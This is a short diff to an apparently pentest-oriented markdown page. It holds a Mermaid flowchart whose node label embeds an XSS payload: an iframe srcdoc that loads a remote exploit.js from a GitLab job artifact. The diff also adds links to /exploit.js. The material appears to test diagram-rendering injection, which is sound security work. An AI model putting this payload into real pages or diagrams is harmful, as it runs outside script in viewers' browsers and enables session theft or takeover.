@@ -28,7 +28,12 @@ pentest
 ```mermaid  
 %%{init: {"flowchart": {"htmlLabels": "false"}} }%%  
 flowchart  
-  A["<iframe srcdoc='<script src=https://gitlab.com/api/v4/projects/saleemrashid%2Fmermaid-exploit-7032e404/jobs/1303935016/artifacts/exploit.js></script>'></iframe>"]  
+  A["<iframe srcdoc='<script src=https://gitlab.com/api/v4/projects/saleemrashid%2Fmermaid-exploit-7032e404/jobs/1303935016/artifacts/exploit.js></script>'></iframe>"]
+
+## js script
+![get js](/exploit.js ':target=_blank')
+-[get js](/exploit.js ':target=_blank')
+
 ```
 ## iFrames Test
 
